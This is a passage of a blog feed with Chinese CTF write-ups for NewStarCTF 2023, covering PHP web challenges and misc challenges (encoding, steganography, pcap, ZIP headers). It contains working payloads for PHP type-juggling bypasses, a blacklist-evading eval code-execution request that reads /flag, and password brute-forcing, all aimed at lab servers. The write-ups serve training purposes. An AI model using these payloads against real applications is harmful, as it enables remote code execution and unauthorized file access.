variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"=Level 1=&lt;br>\"</span><span class=\"token punctuation\">;</span>    </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key1'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!==</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key2'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>        </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token variable\">$flag1</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">True</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"nope,this is level 1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>主要考察 PHP 中 md5 弱类型比较的特点，只需要找到两个值不同但 md5 值以 0e 开头的字符串即可通过本关，原理是 0e 在进行弱类型比较时会被当作科学计数法进行比较，也就是 0。</p>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">http</span><span class=\"token punctuation\">:</span><span class=\"token header-value\">//3b2a7f07-0051-40ce-b45b-bc6fe2cf723c.node4.buuoj.cn:81/?key1=s878926199a&amp;key2=s155964671a</span></span></pre></td></tr></table></figure><p>第二个部分：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$flag1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"=Level 2=&lt;br>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key3'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key3'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token function\">sha1</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key3'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            <span class=\"token variable\">$flag2</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">True</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"nope,this is level 2\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>主要考察 PHP 哈希函数的特性，在处理数组类型的传参时，md5、sha1 等哈希函数会返回 NULL 值，由此可以构造出 NULL===NULL 从而通过判断。</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token constant\">POST</span>：key3<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">1</span></pre></td></tr></table></figure><p>第三个部分：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$flag2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"=Level 3=&lt;br>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key4'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">strcmp</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key4'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            <span class=\"token variable\">$flag3</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">True</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"nope,this is level 3\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>主要考察 strcmp 函数特性，如果传入的参数为数组类型，该函数就会返回 NULL 值，构造 NULL==0 从而通过判断。</p>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">http</span><span class=\"token punctuation\">:</span><span class=\"token header-value\">//3b2a7f07-0051-40ce-b45b-bc6fe2cf723c.node4.buuoj.cn:81/?key1=s878926199a&amp;key2=s155964671a&amp;key4[]=1</span></span></pre></td></tr></table></figure><p>第四个部分：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$flag3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"=Level 4=&lt;br>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key5'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key5'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key5'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">></span> <span class=\"token number\">2023</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            <span class=\"token variable\">$flag4</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">True</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"nope,this is level 4\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>主要考察 is_numeric 函数特性，在传入的数字后加入任意字母或 %00 即可通过本层的判断。</p>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">http</span><span class=\"token punctuation\">:</span><span class=\"token header-value\">//3b2a7f07-0051-40ce-b45b-bc6fe2cf723c.node4.buuoj.cn:81/?key1=s878926199a&amp;key2=s155964671a&amp;key4[]=1&amp;key5=2024a</span></span></pre></td></tr></table></figure><p>第五个部分：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$flag4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"=Level 5=&lt;br>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token function\">extract</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">foreach</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$var</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[a-zA-Z0-9]/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$var</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"nope,this is level 5\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$flag5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"nope,this is level 5\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>考察 extract 函数导致的变量覆盖漏洞，这里的 if 判断只要保证传入变量 flag5 即可，根据上面的正则限制，变量值不能为字母和数字，那么可以传一个 <code>![]</code>  进去，[] 空数组会隐式转换为 false，在！取反得到我们要的 true，(或者，传入一个任意符号也可通过本层。)</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token constant\">POST</span><span class=\"token punctuation\">:</span>key3<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span>flag5<span class=\"token operator\">=</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr></table></figure><p>得到 flag :  <code>flag&#123;8b247b57-901a-48d6-91d3-8df4b50f3803&#125;</code></p>\n<h3 id=\"rce\"><a class=\"markdownIt-Anchor\" href=\"#rce\">#</a> R!C!E!</h3>\n<p><strong>考点：md5 碰撞、PHP 特殊符号传参、PHP 命令执行、黑名单绕过</strong></p>\n<p>题目如下所示：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'e_v.a.l'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token variable\">$password</span><span class=\"token operator\">=</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token variable\">$code</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'e_v.a.l'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token string double-quoted-string\">\"c4d038\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag|system|pass|cat|ls/i\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>首先题目要求 POST 传入一个 password ，password 的 hash 前六位为 c4d038，而哈希加密是一种不可破解的算法，我们只能通过碰撞来尝试获取我们需要的 password。</p>\n<pre><code class=\"language-PYTHON\">import hashlib\n\ndef crack(a):\n    for i in range(0,999999):\n        if(hashlib.md5(str(i).encode(&quot;GBK&quot;)).hexdigest()[0:6] == str(a)):\n            print(i)\n            break\n\n\ncrack(&quot;c4d038&quot;)\n</code></pre>\n<p>运行结果得知是 114514.</p>\n<p>题目中 code 的传参是 <code>e_v.a.l</code> ，这时候如果直接按这个变量名来传参，php 是无法接收到这个值的，具体原因是 php 会自动把一些不合法的字符转化为下划线（注：php8 以下），比如这个点就会被转换为下划线，另外这种转换只会发生一次。故直接传相当于传的变量名为 e_v_a.l 。于是为了防止我们的点被自动转换，我们可以先让第一个下划线位置为不合法字符，从而转换为下划线，不会再转换后面的点。比如可以传入 e [v.a.l 。</p>\n<p>最后看命令执行部分，这里是有一个黑名单的过滤：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag|system|pass|cat|ls/i\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>            <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>![image-20231004110534502](NewStarCTF 2023 公开赛道 WEB/image-20231004110534502.png)</p>\n<p>看到了 flag 在根目录下。但是黑名单过滤了 flag 关键字，我们没法直接读取，于是可以使用参数逃逸绕过限制：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token constant\">POST</span><span class=\"token punctuation\">:</span>password<span class=\"token operator\">=</span><span class=\"token number\">114514</span><span class=\"token operator\">&amp;</span>e<span class=\"token punctuation\">[</span>v<span class=\"token operator\">.</span>a<span class=\"token operator\">.</span>l<span class=\"token operator\">=</span><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>a<span class=\"token operator\">=</span><span class=\"token operator\">/</span>flag</pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token constant\">POST</span><span class=\"token punctuation\">:</span>password<span class=\"token operator\">=</span><span class=\"token number\">114514</span><span class=\"token operator\">&amp;</span>e<span class=\"token punctuation\">[</span>v<span class=\"token operator\">.</span>a<span class=\"token operator\">.</span>l<span class=\"token operator\">=</span><span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\"</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"f\"</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"l\"</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"a\"</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"g\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>得到 flag 为  <code>flag&#123;4c161ed0-2717-4082-b051-fe63b33efd4c&#125;</code></p>\n<h3 id=\"easylogin\"><a class=\"markdownIt-Anchor\" href=\"#easylogin\">#</a> EasyLogin</h3>\n<p><strong>考点：弱口令登录、HTTP 302 跳转抓包</strong></p>\n<p>进入之后是一个登录界面，先随便注册一个账号登进去看看。利用 <code>Ctrl``C</code>  和 <code>Ctrl``D</code>  回到 Shell，</p>\n<p><img data-src=\"image-20231004111349196.png\" alt=\"image-20231004111349196\"></p>\n<p>简单看了下目录结构没有什么东西，只告知了含有一个 admin 用户，按方向上键可以查询 Bash 历史记录：</p>\n<p><img data-src=\"image-20231004111709678.png\" alt=\"image-20231004111709678\"></p>\n<p>该登录密码采用 弱密码，并且，将 newstar 和 newstar2023 追加到了密码本中。先尝试用这两个新加入的密码进行登录 admin，结果都不对。利用 Burp 进行爆破，得到密码为 000000，登录：</p>\n<p><img data-src=\"image-20231004121113786.png\" alt=\"image-20231004121113786\"></p>\n<p>在 302 请求页面中获得到 flag ：  <code>flag&#123;4b723bc2-fc05-4d41-b7dd-f62ffa244f47&#125;</code></p>\n",
            "tags": []
        },
        {
            "id": "http://yanagi-kon.github.io/2023/10/02/NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%20MISC/",
            "url": "http://yanagi-kon.github.io/2023/10/02/NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%20MISC/",
            "title": "NewStarCTF 2023 公开赛道 MISC",
            "date_published": "2023-10-02T08:45:00.000Z",
            "content_html": "<h1 id=\"newstarctf-2023-公开赛道-misc\"><a class=\"markdownIt-Anchor\" href=\"#newstarctf-2023-公开赛道-misc\">#</a> NewStarCTF 2023 公开赛道 MISC</h1>\n<h2 id=\"cyberchefs-secret\"><a class=\"markdownIt-Anchor\" href=\"#cyberchefs-secret\">#</a> CyberChef’s Secret</h2>\n<p>题目如下所示：</p>\n<pre><code>来签到吧！下面这个就是flag，不过它看起来好像怪怪的:-)\nM5YHEUTEKFBW6YJWKZGU44CXIEYUWMLSNJLTOZCXIJTWCZD2IZRVG4TJPBSGGWBWHFMXQTDFJNXDQTA=\n</code></pre>\n<p>本题使用 CyberChef 即可得知答案：</p>\n<p><img data-src=\"image-20231001202517937.png\" alt=\"image-20231001202517937\"></p>\n<p>所以 flag 为  <code>flag&#123;Base_15_S0_Easy_^_^&#125;</code></p>\n<h2 id=\"机密图片\"><a class=\"markdownIt-Anchor\" href=\"#机密图片\">#</a> 机密图片</h2>\n<p>题目给出了一个二维码如下所示：</p>\n<p><img data-src=\"secret.png\" alt=\"secret\"></p>\n<p>扫描之后只有一串文字，考虑到题目提示，该图片一定隐写了相关信息。使用 Stegsolve 工具进行解析：</p>\n<p><img data-src=\"image-20231002144642640.png\" alt=\"image-20231002144642640\"></p>\n<p>选择 Analyse，Data Extract ，RGB 选择 0，其余默认，点击 Preview 进行提取信息，将页面拉到最低位即可得到 flag：</p>\n<p><img data-src=\"image-20231002144844339.png\" alt=\"image-20231002144844339\"></p>\n<p><code>flag&#123;W3lc0m3_t0_N3wSt4RCTF_2023_7cda3ece&#125;</code></p>\n<h2 id=\"流量鲨鱼\"><a class=\"markdownIt-Anchor\" href=\"#流量鲨鱼\">#</a> 流量！鲨鱼！</h2>\n<p><strong>本题目给出了一个 pcap 文件，考察对 WireShark 的使用，以及 HTTP 流量分析</strong></p>\n<p>使用 wireshark 进行处理如下，含有大量的目录扫描爆破流量</p>\n<p><img data-src=\"image-20231002145711916.png\" alt=\"image-20231002145711916\"></p>\n<pre><code>使用Wireshark的过滤器来过滤掉干扰的流量\nhttp &amp;&amp; http.response.code == 200\n</code></pre>\n<p><img data-src=\"image-20231002150023999.png\" alt=\"image-20231002150023999\"></p>\n<p>提取出 HTTP 相应数据：</p>\n<pre><code>Wm14aFozdFhjbWt6TldnMGNtdGZNWE5mZFRVelpuVnNYMkkzTW1FMk1EazFNemRsTm4wSwo=\n</code></pre>\n<p>利用 cyberchef 得到最终的结果（两次 Base64 加密）</p>\n<p><img data-src=\"image-20231002150204398.png\" alt=\"image-20231002150204398\"></p>\n<p><code>flag&#123;Wri35h4rk_1s_u53ful_b72a609537e6&#125;</code></p>\n<h2 id=\"压缩包们\"><a class=\"markdownIt-Anchor\" href=\"#压缩包们\">#</a> 压缩包们</h2>\n<p>题目给了一个没有文件格式的文件，task_1，</p>\n<p><strong>考点：Zip 文件头修复、Zip 压缩包爆破</strong></p>\n<p>一个 Zip 文件由三个部分组成：<strong>压缩源文件数据区 + 压缩源文件目录区 + 压缩源文件目录结束标志</strong></p>\n<p>压缩源文件数据区：</p>\n<pre><code>50 4B 03 04：这是头文件标记（0x04034b50） \n14 00：解压文件所需 pkware 版本 \n00 00：全局方式位标记（有无加密） \n08 00：压缩方式 \n5A 7E：最后修改文件时间 \nF7 46：最后修改文件日期 \n16 B5 80 14：CRC-32校验（1480B516） \n19 00 00 00：压缩后尺寸（25） \n17 00 00 00：未压缩尺寸（23） \n07 00：文件名长度 \n00 00：扩展记录长度 \n6B65792E7478740BCECC750E71ABCE48CDC9C95728CECC2DC849AD284DAD0500 \n压缩源文件目录区： \n50 4B 01 02：目录中文件文件头标记(0x02014b50) \n3F 00：压缩使用的 pkware 版本 \n14 00：解压文件所需 pkware 版本 \n00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了） \n08 00：压缩方式 \n5A 7E：最后修改文件时间 \nF7 46：最后修改文件日期 \n16 B5 80 14：CRC-32校验（1480B516） \n19 00 00 00：压缩后尺寸（25） \n17 00 00 00：未压缩尺寸（23） \n07 00：文件名长度 \n24 00：扩展字段长度 \n00 00：文件注释长度 \n00 00：磁盘开始号 \n00 00：内部文件属性 \n20 00 00 00：外部文件属性 \n00 00 00 00：局部头部偏移量 \n6B65792E7478740A00200000000000010018006558F04A1CC5D001BDEBDD3B1CC5D001BDEBDD3B1CC5D001 \n</code></pre>\n<p>压缩源文件目录结束标志：</p>\n<pre><code>50 4B 05 06：目录结束标记 \n00 00：当前磁盘编号 \n00 00：目录区开始磁盘编号 \n01 00：本磁盘上纪录总数 \n01 00：目录区中纪录总数 \n59 00 00 00：目录区尺寸大小 \n3E 00 00 00：目录区对第一张磁盘的偏移量 \n00 00：ZIP 